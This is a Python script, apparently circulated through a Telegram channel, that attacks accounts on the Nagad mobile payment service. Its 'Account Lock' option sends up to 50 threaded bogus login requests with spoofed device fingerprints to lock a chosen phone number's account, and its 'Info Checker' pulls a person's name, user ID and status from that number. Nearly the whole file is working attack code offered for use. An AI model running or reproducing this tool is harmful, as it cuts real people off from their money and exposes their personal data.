import requests
import random
import string
import threading
import os
import subprocess
from termcolor import colored
import hashlib
import webbrowser
import time

def install_missing_modules():
    required_modules = ["termcolor", "requests"]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call(["pip", "install", module], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_missing_modules()

banner = r"""
NARUTO UZUMAKI
TELEGRAM : @naruto_world2
Password In Telegram 
"""

colored_banner = banner.replace("NARUTO", colored("NARUTO", "red")).replace("UZUMAKI", colored("UZUMAKI", "green"))
print(colored_banner)

def generate_random_fgp():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=64))

def encrypt_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def password_check():
    correct_password = "BN NARUTO"
    entered_password = input("Enter Password: ")
    if encrypt_password(entered_password) != encrypt_password(correct_password):
        print("Incorrect Password. Please Check Naruto Official Telegram Channel")
        webbrowser.open("https://t.me/naruto_world2")
        exit()
    else:
        print("Password Verified.")

def nagad_login():
    url = 'https://app2.mynagad.com:20002/api/login'
    headers = {
        'Host': 'app2.mynagad.com:20002',
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=UTF-8',
        'X-KM-UserId': '1894306',
        'X-KM-User-AspId': '100012345612345',
        'X-KM-User-Agent': 'ANDROID/1164',
        'X-KM-Accept-language': 'bn',
        'X-KM-AppCode': '01'
    }

    username = input("Enter the Number: ")

    payload = {
        "aspId": "100012345612345",
        "mpaId": None,
        "password": "2EE1A4C2B1F11F0CA375D1429E7902A1D84B900348AE65E624C83B1589FF2E27",
        "username": username
    }

    stop_sending = False

    def send_request(request_number):
        nonlocal stop_sending
        if stop_sending:
            return

        local_headers = headers.copy()
        local_headers['X-KM-DEVICE-FGP'] = generate_random_fgp()
        print(f"Sending request {request_number}...")
        response = requests.post(url, headers=local_headers, json=payload)
        print(f"Request {request_number} Status Code:", response.status_code)
        print(f"Request {request_number} Response Text:", response.text)

        if response.status_code == 401:
            print("Nagad Account Lock Successful Naruto Uzumaki ")
            stop_sending = True

    threads = []
    for i in range(50):
        thread = threading.Thread(target=send_request, args=(i + 1,))
        threads.append(thread)
        thread.start()
        time.sleep(random.uniform(0.5, 1.5))

        if stop_sending:
            break

    for thread in threads:
        thread.join()

def nagad_check_user():
    url = "https://app2.mynagad.com:20002/api/user/check-user-status-for-log-in"

    msisdn = input("Enter the Number: ")

    params = {
        "msisdn": msisdn
    }

    headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/3.14.9",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1164",
        "X-KM-DEVICE-FGP": generate_random_fgp(),
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01"
    }

    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        try:
            data = response.json()
            print("Name:", data.get("name", "N/A"))
            print("UserId:", data.get("userId", "N/A"))
            print("Status:", data.get("status", "N/A"))
        except json.JSONDecodeError:
            print("Failed to parse response as JSON.")
    else:
        print("Request failed with status code:", response.status_code)

password_check()

while True:
    print("\nSelect an option:")
    print("1. Nagad Account Info Checker")
    print("2. Nagad Account Lock")
    print("3. Back")
    choice = input("Enter your choice: ")

    if choice == "1":
        nagad_check_user()
    elif choice == "2":
        nagad_login()
    elif choice == "3":
        print("Exit.")
        break
    else:
        print("Invalid choice. Please try again.")
